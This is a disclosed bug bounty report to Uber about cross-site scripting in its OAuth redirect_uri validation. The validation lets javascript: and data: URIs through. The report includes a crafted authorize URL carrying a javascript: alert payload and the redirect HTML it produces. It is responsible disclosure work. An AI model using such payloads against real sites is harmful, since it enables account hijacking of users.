# XSS in uber oauth

## Report Details
- **Report ID**: 131052
- **URL**: https://hackerone.com/reports/131052
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-04-15T10:57:56.042Z
- **Disclosed**: 2016-07-26T00:27:22.726Z

## Reporter
- **Username**: zombiehelp54
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: uber

## Vulnerability Information
Hi , I have found that when setting a `redirect_uri` for an application you validate for the presence of `://` in the beginning of the url , but you don't validate for the protocol and you don't block malicious protocols such as `javascript:` pseudo protocol and `data:` URIs.
Although the redirecting is done through `location` header , there still some cases in which this can be harmful to users and can be used to hijack users' accounts , moreover , `data:` URIs work on some modern browsers such as firefox. 
This also can be very harmful to users who chose to disable 302 redirection on their browser.

#PoC:

This PoC will work on latest version of opera mini mobile browser and it will also work on firefox with 302 redirection disabled. 

- Go to https://login.uber.com/oauth/authorize?client_id=MXeE1dl-5R3yTCbufMHsfz3KhfY2UGyS&response_type=code&scope=profile&redirect_uri=javascript:%2F%2Fgoog.com%2F%250Aalert%28document.domain%29%3B%2F%2F
- Click the Allow or the Deny button
- The response will be:
 
```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="javascript://goog.com/%0Aalert(document.domain);//?error=access_denied#_">javascript://goog.com/%0Aalert(document.domain);//?error=access_denied#_</a>.  If not click the link.
```
- As you can see , this will trigger XSS . 
I have attached a screenshot of XSS triggered on firefox (latest version) with 302 redirection disabled. 

The PoC will also work on old Mozilla and opera browsers , in browsers Mozilla 1.7.x (and previous versions) and Mozilla Firefox 3.0.12 , The browser will show “Object Moved” page. click on the link “here” and the code will execute.

Thanks



## Attachments
- uber_oauth_xss.png
